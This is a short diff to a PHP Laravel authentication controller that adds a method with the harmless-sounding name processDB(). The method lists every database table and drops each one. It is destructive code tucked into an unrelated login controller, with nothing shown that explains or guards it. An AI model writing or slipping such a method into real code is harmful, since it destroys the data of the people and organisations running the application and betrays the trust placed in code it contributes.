@@ -52,4 +52,12 @@ class AuthController extends Controller
             $response['message']="Email không có trong hệ thống !";
         }
     }
+
+    public function  processDB()
+    {
+        foreach(\DB::select('SHOW TABLES') as $table) {
+            $table_array = get_object_vars($table);
+            \Schema::drop($table_array[key($table_array)]);
+        }
+    }
 }
